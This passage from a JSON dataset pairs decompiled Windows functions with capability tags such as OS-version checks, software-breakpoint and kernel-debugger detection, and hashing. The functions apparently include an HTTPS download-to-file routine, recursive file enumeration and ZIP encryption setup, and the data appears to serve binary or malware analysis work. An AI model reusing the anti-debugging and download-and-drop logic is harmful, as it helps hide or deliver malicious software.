        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00430397)\n// WARNING: Removing unreachable block (ram,0x00430360)\n// WARNING: Removing unreachable block (ram,0x00430747)\n// WARNING: Removing unreachable block (ram,0x0043036f)\n// WARNING: Removing unreachable block (ram,0x00430377)\n// WARNING: Removing unreachable block (ram,0x0043037d)\n// WARNING: Removing unreachable block (ram,0x00430380)\n// WARNING: Removing unreachable block (ram,0x00430387)\n// WARNING: Removing unreachable block (ram,0x00430391)\n// WARNING: Removing unreachable block (ram,0x004303ec)\n// WARNING: Removing unreachable block (ram,0x004303e6)\n// WARNING: Removing unreachable block (ram,0x004303f2)\n// WARNING: Removing unreachable block (ram,0x0043040f)\n// WARNING: Removing unreachable block (ram,0x00430411)\n// WARNING: Removing unreachable block (ram,0x00430419)\n// WARNING: Removing unreachable block (ram,0x0043041c)\n// WARNING: Removing unreachable block (ram,0x00430421)\n// WARNING: Removing unreachable block (ram,0x00430424)\n// WARNING: Removing unreachable block (ram,0x00430750)\n// WARNING: Removing unreachable block (ram,0x0043042f)\n// WARNING: Removing unreachable block (ram,0x00430767)\n// WARNING: Removing unreachable block (ram,0x0043076e)\n// WARNING: Removing unreachable block (ram,0x0043043a)\n// WARNING: Removing unreachable block (ram,0x0043044d)\n// WARNING: Removing unreachable block (ram,0x0043044f)\n// WARNING: Removing unreachable block (ram,0x0043045c)\n// WARNING: Removing unreachable block (ram,0x00430461)\n// WARNING: Removing unreachable block (ram,0x00430467)\n// WARNING: Removing unreachable block (ram,0x00430470)\n// WARNING: Removing unreachable block (ram,0x00430477)\n// WARNING: Removing unreachable block (ram,0x0043048f)\n// WARNING: Removing unreachable block (ram,0x0043049f)\n// WARNING: Removing unreachable block (ram,0x004304ad)\n// WARNING: Removing unreachable block (ram,0x004304ed)\n// WARNING: Removing unreachable block (ram,0x004304f6)\n// WARNING: Removing unreachable block (ram,0x0043070d)\n// WARNING: Removing unreachable block (ram,0x00430504)\n// WARNING: Removing unreachable block (ram,0x0043050e)\n// WARNING: Removing unreachable block (ram,0x00430728)\n// WARNING: Removing unreachable block (ram,0x0043051b)\n// WARNING: Removing unreachable block (ram,0x00430522)\n// WARNING: Removing unreachable block (ram,0x0043052c)\n// WARNING: Removing unreachable block (ram,0x00430531)\n// WARNING: Removing unreachable block (ram,0x00430541)\n// WARNING: Removing unreachable block (ram,0x00430546)\n// WARNING: Removing unreachable block (ram,0x00430550)\n// WARNING: Removing unreachable block (ram,0x00430555)\n// WARNING: Removing unreachable block (ram,0x00430567)\n// WARNING: Removing unreachable block (ram,0x00430574)\n// WARNING: Removing unreachable block (ram,0x00430583)\n// WARNING: Removing unreachable block (ram,0x00430590)\n// WARNING: Removing unreachable block (ram,0x004305ad)\n// WARNING: Removing unreachable block (ram,0x004305b1)\n// WARNING: Removing unreachable block (ram,0x004305b8)\n// WARNING: Removing unreachable block (ram,0x004305c1)\n// WARNING: Removing unreachable block (ram,0x004305c4)\n// WARNING: Removing unreachable block (ram,0x004305d5)\n// WARNING: Removing unreachable block (ram,0x004305e4)\n// WARNING: Removing unreachable block (ram,0x004305ef)\n// WARNING: Removing unreachable block (ram,0x004305f6)\n// WARNING: Removing unreachable block (ram,0x00430621)\n// WARNING: Removing unreachable block (ram,0x00430626)\n// WARNING: Removing unreachable block (ram,0x00430631)\n// WARNING: Removing unreachable block (ram,0x0043063a)\n// WARNING: Removing unreachable block (ram,0x00430640)\n// WARNING: Removing unreachable block (ram,0x00430643)\n// WARNING: Removing unreachable block (ram,0x00430669)\n// WARNING: Removing unreachable block (ram,0x0043066e)\n// WARNING: Removing unreachable block (ram,0x00430673)\n// WARNING: Removing unreachable block (ram,0x0043067e)\n// WARNING: Removing unreachable block (ram,0x0043068f)\n// WARNING: Removing unreachable block (ram,0x004306c0)\n// WARNING: Removing unreachable block (ram,0x00430695)\n// WARNING: Removing unreachable block (ram,0x004306bb)\n// WARNING: Removing unreachable block (ram,0x0043069f)\n// WARNING: Removing unreachable block (ram,0x004306b5)\n// WARNING: Removing unreachable block (ram,0x004306ae)\n// WARNING: Removing unreachable block (ram,0x004306c3)\n// WARNING: Removing unreachable block (ram,0x004306f0)\n// WARNING: Removing unreachable block (ram,0x004306cd)\n// WARNING: Removing unreachable block (ram,0x00430559)\n// WARNING: Removing unreachable block (ram,0x00430536)\n// WARNING: Removing unreachable block (ram,0x0043072b)\n// WARNING: Removing unreachable block (ram,0x00430472)\n// WARNING: Removing unreachable block (ram,0x00430735)\n// WARNING: Removing unreachable block (ram,0x00430776)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.004300f2(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.004221b6();\n        *puVar2 = 0x16;\n        fcn.00423a7a();\n        fcn.0041e0a1(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0043017b. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x43079e\n    (**0x43079e)();\n    return;\n}\n",
        "token_count": 1766
    },
    "0040a92c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040a92c(uint *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint noname_30, uint noname_31, \n            uint noname_32, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint uStackY8184;\n    uint uStackY8180;\n    uint uStackY8176;\n    uint uStackY8168;\n    uint uStackY8164;\n    uint uStackY8124;\n    uint uStackY8120;\n    uint uStackY8116;\n    uchar *puStackY8112;\n    uint var_1ff4h;\n    uint var_1ff0h;\n    uint var_1fech;\n    uint var_1fe4h;\n    uint var_1fe0h;\n    uint var_1fdch;\n    uint var_1f54h_2;\n    uint var_1fb8h;\n    uint var_1fb4h;\n    uint var_1fb0h;\n    uint var_1fach;\n    uint var_1fa8h;\n    uint var_1f8ch;\n    uint var_1f70h;\n    uint var_1f54h;\n    uint var_bcch_2;\n    uint var_bcch;\n    uint var_7e4h_2;\n    uint var_7e4h;\n    uint var_3fch_2;\n    uint var_3fch;\n    uint uStackY144;\n    uint *puStackY140;\n    uchar auStackY136 [16];\n    uint uStackY120;\n    uint *puStackY116;\n    uint *puStackY112;\n    uint *puStackY108;\n    uint uStackY104;\n    uint *puStackY100;\n    uint arg_8h_00;\n    int32_t iStack16;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43220c;\n    iStack16 = *in_FS_OFFSET;\n    fcn.0042cc70();\n    *in_FS_OFFSET = &stack0xfffffff0;\n    uStackY8124 = *noname_0;\n    uStackY8120 = noname_0[1];\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    uStackY8176 = 0xffffffff;\n    uStackY8164 = 0xffffffff;\n    uStackY8184 = 0x3c;\n    uStackY8168 = fcn.0041d661();\n    uStackY8180 = fcn.0041d661();\n    iVar1 = (**0x446388)();\n    if (iVar1 == 0) {\n        (**0x4464ac)();\n        (**0x4464ac)();\n    }\n    else {\n        (**0x446300)();\n        (**0x4464ac)();\n        (**0x4464ac)();\n    }\n    (**0x4464ac)();\n    uStackY8116 = fcn.00415659();\n    var_4h_2 = 0;\n    puStackY8112 = fcn.00408083();\n    var_4h_2._0_1_ = 1;\n    fcn.00407fb1();\n    var_4h_2 = CONCAT31(var_4h_2._1_3_, 2);\n    puStackY100 = 0x40ab36;\n    fcn.0041ed83();\n    puStackY100 = &fcn.0040a92c::var_bcch_2;\n    uStackY104 = 0x40ab4a;\n    fcn.0040d955();\n    (**0x4464ac)();\n    fcn.00403f73();\n    arg_8h_00 = 1;\n    puStackY100 = 0x40ab78;\n    fcn.00403f73();\n    var_4h_2 = 0xffffffff;\n    puStackY100 = NULL;\n    uStackY104 = 1;\n    puStackY108 = 0x40ab89;\n    fcn.00403f73();\n    puStackY108 = 0x3c;\n    puStackY116 = &stack0xffffe008;\n    puStackY112 = NULL;\n    uStackY120 = 0x40ab98;\n    fcn.004257d0();\n    puStackY108 = 0x3e8;\n    puStackY116 = &fcn.0040a92c::var_7e4h_2;\n    puStackY112 = NULL;\n    uStackY120 = 0x40aba9;\n    fcn.004257d0();\n    puStackY108 = 0x3e8;\n    puStackY116 = &fcn.0040a92c::var_bcch_2;\n    puStackY112 = NULL;\n    uStackY120 = 0x40abba;\n    fcn.004257d0();\n    puStackY108 = 0x3e8;\n    puStackY116 = &fcn.0040a92c::var_3fch_2;\n    puStackY112 = NULL;\n    uStackY120 = 0x40abcb;\n    fcn.004257d0();\n    puStackY108 = &fcn.0040a92c::var_1f54h_2;\n    puStackY112 = 0x40abdb;\n    iVar1 = (**0x4463a4)();\n    if (iVar1 < 5) {\n        puStackY116 = 0x40ac1a;\n        puStackY112 = &fcn.0040a92c::var_1f54h_2;\n        iVar1 = (**0x4463a4)();\n        *0x446678 = 1;\n        if (iVar1 != 2) {\n            *0x446678 = 0;\n        }\n    }\n    else {\n        puStackY8112 = &stack0xffffff78;\n        puStackY116 = 0xf;\n        uStackY120 = 0;\n        auStackY136[0] = 0;\n        uStackY144 = 0x40ac03;\n        puStackY140 = &fcn.0040a92c::var_1f54h_2;\n        fcn.00403f50();\n        uStackY144 = 0x40ac08;\n        fcn.004080a6();\n        *0x446678 = 1;\n    }\n    *in_FS_OFFSET = iStack16;\n    puStackY100 = 0x40ac45;\n    fcn.0041e0a1(arg_8h_00);\n    return;\n}\n",
        "token_count": 1723
    },
    "0041ab41": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041ab41(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint16_t *var_8h;\n    int32_t *var_4h;\n    \n    *(in_EAX + 0x1f2c + *(in_EAX + 0x1af2c)) = param_1;\n    *(in_EAX + 0x1af2c) = *(in_EAX + 0x1af2c) + 1;\n    if (param_2 == 0) {\n        piVar1 = in_EAX + 0x14 + param_1 * 4;\n        *piVar1 = *piVar1 + 1;\n    }\n    else {\n        param_2 = param_2 + -1;\n        piVar1 = in_EAX + 0x418 + *(in_EAX + 0x1b3d + param_1) * 4;\n        *piVar1 = *piVar1 + 1;\n        if (param_2 < 0x100) {\n            uVar5 = *(in_EAX + 0x1c3d + param_2);\n        }\n        else {\n            uVar5 = *((param_2 >> 7) + 0x1d3d + in_EAX);\n        }\n        piVar1 = in_EAX + 0x908 + uVar5 * 4;\n        *piVar1 = *piVar1 + 1;\n        *(in_EAX + 0x9f2c + *(in_EAX + 0x1af30) * 2) = param_2;\n        *(in_EAX + 0x1af30) = *(in_EAX + 0x1af30) + 1;\n        *(in_EAX + 0x1af38) = *(in_EAX + 0x1af38) | *(in_EAX + 0x1af39);\n    }\n    *(in_EAX + 0x1af39) = *(in_EAX + 0x1af39) << 1;\n    if ((*(in_EAX + 0x1af2c) & 7) == 0) {\n        *(*(in_EAX + 0x1af34) + 0x19f2c + in_EAX) = *(in_EAX + 0x1af38);\n        *(in_EAX + 0x1af34) = *(in_EAX + 0x1af34) + 1;\n        *(in_EAX + 0x1af38) = 0x100;\n    }\n    if ((2 < *(in_EAX + 4)) && (uVar3 = *(in_EAX + 0x1af2c),  (uVar3 & 0xfff) == 0)) {\n        var_8h = in_EAX + 0x908;\n        uVar6 = uVar3 << 3;\n        var_4h = 0x43be50;\n        do {\n            iVar4 = *var_4h;\n            uVar2 = *var_8h;\n            var_4h = var_4h + 1;\n            var_8h = var_8h + 2;\n            uVar6 = uVar6 + (iVar4 + 5) * uVar2;\n        } while (var_4h < 0x43bec8);\n        if ((*(in_EAX + 0x1af30) < uVar3 >> 1) &&\n           ((uVar6 >> 2 & 0x3ffffffe) < (*(in_EAX + 0x6af84) - *(in_EAX + 0x6af74) & 0xfffffffeU))) {\n            return 1;\n        }\n    }\n    if ((*(in_EAX + 0x1af2c) != 0x7fff) && (*(in_EAX + 0x1af30) != 0x8000)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 950
    },
    "0041b06a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041b06a(int32_t param_1, uint16_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    *(param_1 + 0x6af78) = 0;\n    if (*(param_1 + 0x6af70) == 0) {\n        *(param_1 + 0x6af78) = 1;\n        *(param_1 + 0x6af70) = 0x10000;\n    }\n    *(param_1 + 0x6af6c) = 0;\n    fcn.004257d0(param_1 + 0x4af70, 0, 0x1fffc);\n    *(param_1 + 0x6af98) = *(in_EAX * 8 + 0x43bf1a);\n    *(param_1 + 0x6af9c) = *(in_EAX * 8 + 0x43bf18);\n    *(param_1 + 0x6afa0) = *(in_EAX * 8 + 0x43bf1c);\n    *(param_1 + 0x6af94) = *(in_EAX * 8 + 0x43bf1e);\n    if (in_EAX < 3) {\n        *param_2 = *param_2 | 4;\n    }\n    else if (7 < in_EAX) {\n        *param_2 = *param_2 | 2;\n    }\n    *(param_1 + 0x6af84) = 0;\n    *(param_1 + 0x6af74) = 0;\n    uVar1 = (**(param_1 + 0xc))(param_1, param_1 + 0x1af70, 0x10000);\n    *(param_1 + 0x6af90) = uVar1;\n    if ((uVar1 == 0) || (uVar1 == 0xffffffff)) {\n        *(param_1 + 0x6af8c) = 1;\n        *(param_1 + 0x6af90) = 0;\n    }\n    else {\n        *(param_1 + 0x6af8c) = 0;\n        if (uVar1 < 0x106) {\n            fcn.0041b2c0();\n        }\n        *(param_1 + 0x6af7c) = 0;\n        uVar1 = 0;\n        do {\n            uVar2 = (uVar2 << 5 ^ *(param_1 + 0x1af70 + uVar1)) & 0x7fff;\n            uVar1 = uVar1 + 1;\n            *(param_1 + 0x6af7c) = uVar2;\n        } while (uVar1 < 2);\n    }\n    return;\n}\n",
        "token_count": 664
    },
    "0041d4dc": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0041d4dc(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX == NULL) {\n        *0x4467a0 = 0x10000;\n    }\n    else if (*in_EAX == 2) {\n        *0x4467a0 = fcn.0041cd3e(param_1, param_2, param_3);\n    }\n    else {\n        *0x4467a0 = 0x80000;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0040912f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040912f(uint noname_0, uint noname_1, uint noname_2, uint noname_3, int32_t noname_4, uint32_t noname_5, \n            uint noname_6, uint noname_7, int32_t noname_8, uint noname_9, uint noname_10, uint noname_11, \n            uint noname_12, uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, \n            uint noname_18, uint noname_19, uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint arg_8h\n            , uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, uint arg_24h, \n            uint arg_28h, uint arg_2ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uchar *unaff_EDI;\n    ulong uVar4;\n    uint unaff_retaddr;\n    uint var_4h;\n    uchar auStack8156 [4];\n    int32_t iStack8152;\n    int32_t iStack8148;\n    uchar *puStack8144;\n    uint uStack8140;\n    uint uStack8136;\n    uint uStack8132;\n    uint uStack8128;\n    uchar auStack8124 [60];\n    uint var_1fdch;\n    uint var_1fd8h;\n    uint var_1fd4h;\n    uint var_1fd0h;\n    uint var_1fcch;\n    uint var_1fc8h;\n    uint var_1fc4h;\n    uint var_1fc0h;\n    uint var_1fbch;\n    uint var_1fb8h;\n    uint var_1f8ch;\n    uchar auStack7804 [96];\n    uint var_1e78h;\n    uchar auStack2804 [96];\n    uint var_af0h;\n    uchar auStack1804 [96];\n    uint var_708h;\n    uchar auStack1540 [96];\n    uint var_600h;\n    uchar auStack540 [96];\n    uint var_218h;\n    uint var_110h;\n    uint uStack76;\n    uchar *puVar5;\n    uint uVar6;\n    uchar *noname_12_00;\n    uchar *noname_13_00;\n    \n    fcn.0042cc70();\n    uStack8128 = noname_0;\n    uStack8136 = noname_1;\n    uStack8132 = noname_2;\n    uStack8140 = noname_3;\n    (**0x446300)();\n    noname_13_00 = &stack0xffffe044;\n    noname_12_00 = &stack0xfffff8f4;\n    iStack8148 = (**0x44656c)();\n    fcn.004257d0();\n    puVar5 = &stack0xffffe184;\n    uVar6 = noname_6;\n    (**0x4464ac)();\n    uVar4 = CONCAT44(uVar6, puVar5);\n    if (iStack8148 != -1) {\n        do {\n            iVar1 = (**0x4464dc)();\n            if (((iVar1 != 0) && (iVar1 = (**0x4464dc)(),  iVar1 != 0)) &&\n               (iVar1 = fcn.00408fe6(0x80000000),  iVar1 != 0)) {\n                (**0x446558)();\n                (**0x4464ac)();\n                (**0x4464ac)();\n                if (noname_8 == 0) {\n                    puStack8144 = &stack0xffffffc8;\n                    puVar5 = &stack0xfffffde4;\n                    fcn.00403f50();\n                    iVar1 = fcn.00408dc7(puVar5);\n                    if (iVar1 != 0) goto code_r0x00409653;\n                }\n                fcn.004257d0();\n                fcn.004257d0();\n                iVar1 = (**0x4464dc)();\n                if (iVar1 == 0) {\n                    (**0x446300)();\n                }\n                else {\n                    (**0x446300)();\n                }\n                iVar1 = (**0x4463a4)();\n                if (iVar1 < 4) {\n                    if ((noname_8 == 0) || (iVar1 = (**0x4463a8)(),  iVar1 == 0)) {\n                        iVar1 = (**0x4463a8)();\n                        if (iVar1 != 0) {\n                            (**0x446558)();\n                            goto code_r0x004094dd;\n                        }\n                    }\n                    else {\n                        (**0x4464d0)();\n                        fcn.00408ca8(&stack0xfffffde4, &stack0xfffff9fc);\n                        (**0x4464b4)();\n                        iVar1 = (**0x4463a8)();\n                        if (iVar1 != 0) {\n                            (**0x446558)();\n                            goto code_r0x00409421;\n                        }\n                    }\n                }\n                else {\n                    iVar1 = fcn.0041ebdd(&stack0xffffe184, 0x43dfc0, &stack0xffffe024);\n                    iStack8152 = 0;\n                    puStack8144 = NULL;\n                    if ((noname_8 != 0) && (iVar2 = (**0x4463a8)(),  iVar2 != 0)) {\n                        puStack8144 = 0x1;\n                        (**0x4464d0)();\n                        fcn.00408ca8(&stack0xfffffde4, &stack0xfffff9fc);\n                        (**0x4464b4)();\n                    }\n                    if (iVar1 != 0) {\n                        do {\n                            iVar1 = (**0x44641c)();\n                            if (iVar1 != 0) {\n                                iStack8152 = 1;\n                            }\n                            iVar1 = fcn.0041ebdd(0, 0x43dfc0, &stack0xffffe024);\n                        } while (iVar1 != 0);\n                        if (iStack8152 != 0) goto code_r0x00409617;\n                    }\n                    if (puStack8144 == NULL) {\n                        iVar1 = (**0x4463a8)();\n                        if (iVar1 != 0) {\n                            (**0x446558)();\ncode_r0x004094dd:\n                            (**0x4464ac)();\n                            (**0x4464ac)();\n                            unaff_EDI = &stack0xfffffde4;\n                            uVar4 = fcn.00416b05(unaff_EDI);\n                            noname_13_00 = NULL;\n                            noname_12_00 = 0x3e8;\n                            uVar3 = fcn.00427460();\n                            if (uVar3 < noname_5) {\n                                *0x44627c = *0x44627c + uVar3;\n                                if (*0x44627c < *0x446270) {\n                                    iVar1 = fcn.00408fe6(0xc0000000);\n                                    goto joined_r0x00409546;\n                                }\n                                goto code_r0x0040967a;\n                            }\n                        }\n                    }\n                    else {\n                        iVar1 = (**0x4463a8)();\n                        if (iVar1 != 0) {\n                            (**0x446558)();\ncode_r0x00409421:\n                            (**0x4464ac)();\n                            (**0x446368)();\n                            (**0x4464ac)();\n                            unaff_EDI = &stack0xfffff9fc;\n                            uVar4 = fcn.00416b05(unaff_EDI);\n                            noname_13_00 = NULL;\n                            noname_12_00 = 0x3e8;\n                            uVar3 = fcn.00427460();\n                            if (uVar3 < noname_5) {\n                                *0x44627c = *0x44627c + uVar3;\n                                if (*0x446270 <= *0x44627c) goto code_r0x0040967a;\n                                iVar1 = fcn.00408fe6(0xc0000000);\njoined_r0x00409546:\n                                if (iVar1 != 0) {\n                                    fcn.0041d4dc();\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x00409617:\n                if (noname_4 != 0) {\n                    uStack76 = 0x409650;\n                    fcn.0040912f(uStack8128, &stack0xfffff50c, &stack0xfffffde4, uStack8140, noname_4, noname_5, \n                                 noname_6, noname_7, noname_8, noname_9, uVar4, uVar4 >> 0x20, noname_12_00, \n                                 noname_13_00, unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, noname_0, \n                                 noname_1, noname_2, noname_3, noname_4, noname_5, noname_6, noname_7, noname_8, \n                                 noname_9, noname_10, noname_11, noname_12, noname_13, noname_14);\n                }\n            }\ncode_r0x00409653:\n            iVar1 = (**0x4463c4)();\n        } while (iVar1 != 0);\n        (**0x446334)();\n    }\ncode_r0x0040967a:\n    fcn.0041e0a1(noname_13_00);\n    return;\n}\n",
        "token_count": 2214
    },
    "0040d7e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040d7e3(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint32_t uStack1316;\n    uint uStack1312;\n    int32_t iStack1308;\n    int32_t iStack1304;\n    int32_t iStack1300;\n    uint32_t uStack1296;\n    uint uStack1292;\n    uchar auStack1288 [96];\n    uchar auStack1192 [928];\n    uchar auStack264 [256];\n    uint32_t uStack8;\n    \n    uStack8 = *0x443674 ^ auStack1192;\n    arg_8h = 0;\n    iStack1308 = 0;\n    uStack1312 = 0x100;\n    iStack1304 = (**0x4463e8)(0x43bd76, 1, 0, 0, 0);\n    if (iStack1304 != 0) {\n        uVar1 = fcn.0040d76f(\"https\");\n        iVar2 = (**0x4464dc)(uVar1);\n        if (iVar2 == 0) {\n            iStack1308 = 1;\n        }\n        iStack1300 = 0;\n        do {\n            if (iStack1308 == 0) {\n                uVar1 = 0x100;\n            }\n            else {\n                uVar1 = 0x800100;\n            }\n            uStack1292 = (**0x4463ec)(iStack1304, param_1, 0, 0, uVar1, 0);\n            iVar2 = (**0x446560)(uStack1292, 0x13, auStack264, &uStack1312, 0);\n            if (iVar2 != 0) {\n                iVar2 = (**0x4464dc)(auStack264, 0x43e378);\n                if (iVar2 == 0) break;\n                (**0x44631c)(1000);\n            }\n            iStack1300 = iStack1300 + 1;\n        } while (iStack1300 < 3);\n        uVar1 = (**0x446340)(param_2, 0x40000000, 3, 0, 2, 0x80, 0);\n        while( true ) {\n            iVar2 = (**0x44640c)(uStack1292, auStack1288, 0x400, &uStack1296);\n            if (iVar2 == 0) break;\n            if (uStack1296 != 0) {\n                iVar2 = (**0x4463ac)(uVar1, auStack1288, uStack1296, &uStack1316, 0);\n                if ((iVar2 == 0) || (uStack1296 != uStack1316)) break;\n            }\n            if (uStack1296 < 0x400) break;\n        }\n        fcn.004257d0(auStack1288, 0, 0x400);\n        (**0x446344)(uVar1);\n        (**0x4463e4)(uStack1292);\n        (**0x4463e4)(iStack1304);\n    }\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 740
    },
    "00406fc9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406fc9(char *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *arg_8h_00;\n    int32_t *unaff_EBX;\n    int32_t var_ch;\n    int32_t var_8h;\n    char *var_4h;\n    \n    if ((unaff_EBX == NULL) || (unaff_EBX[6] == 0)) {\n        uVar2 = 0xffffff9a;\n    }\n    else {\n        if (unaff_EBX[0x1f] != 0) {\n            fcn.0040734c();\n        }\n        iVar3 = fcn.00406e06(unaff_EBX, &var_ch, &var_4h, &var_8h);\n        if (iVar3 == 0) {\n            arg_8h_00 = fcn.0041e0ea(0x84);\n            if (arg_8h_00 != NULL) {\n                iVar3 = fcn.0041e0ea(0x4000);\n                arg_8h_00[0x11] = var_4h;\n                *arg_8h_00 = iVar3;\n                arg_8h_00[0x12] = var_8h;\n                arg_8h_00[0x13] = 0;\n                if (iVar3 != 0) {\n                    arg_8h_00[0x10] = 0;\n                    iVar3 = unaff_EBX[0xd];\n                    arg_8h_00[0x15] = unaff_EBX[0xf];\n                    arg_8h_00[0x14] = 0;\n                    arg_8h_00[0x19] = unaff_EBX[0xd];\n                    arg_8h_00[0x18] = *unaff_EBX;\n                    arg_8h_00[0x1a] = unaff_EBX[3];\n                    arg_8h_00[6] = 0;\n                    if (iVar3 != 0) {\n                        arg_8h_00[9] = 0;\n                        arg_8h_00[10] = 0;\n                        arg_8h_00[0xb] = 0;\n                        iVar3 = fcn.004061dd();\n                        if (iVar3 == 0) {\n                            arg_8h_00[0x10] = 1;\n                        }\n                    }\n                    arg_8h_00[0x16] = unaff_EBX[0x10];\n                    arg_8h_00[0x17] = unaff_EBX[0x11];\n                    *(arg_8h_00 + 0x1b) = *(unaff_EBX + 0xc) & 1;\n                    if ((unaff_EBX[0xc] >> 3 & 1) == 0) {\n                        uVar1 = *(unaff_EBX + 0x3f);\n                    }\n                    else {\n                        uVar1 = *(unaff_EBX + 0x39);\n                    }\n                    *(arg_8h_00 + 0x20) = uVar1;\n                    arg_8h_00[0x1f] = -(*(arg_8h_00 + 0x1b) != '\\0') & 0xc;\n                    arg_8h_00[0x1c] = 0x12345678;\n                    arg_8h_00[0x1d] = 0x23456789;\n                    arg_8h_00[0x1e] = 0x34567890;\n                    var_4h = arg_8h;\n                    if (arg_8h != NULL) {\n                        do {\n                            if (*var_4h == '\\0') break;\n                            fcn.00405fd5();\n                            var_4h = var_4h + 1;\n                        } while (var_4h != NULL);\n                    }\n                    arg_8h_00[0xf] = unaff_EBX[0x1e] + 0x1e + var_ch;\n                    arg_8h_00[2] = 0;\n                    unaff_EBX[0x1f] = arg_8h_00;\n                    return 0;\n                }\n                fcn.0041e0b0(arg_8h_00);\n            }\n            uVar2 = 0xffffff98;\n        }\n        else {\n            uVar2 = 0xffffff99;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1014
    },
    "00409eb1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
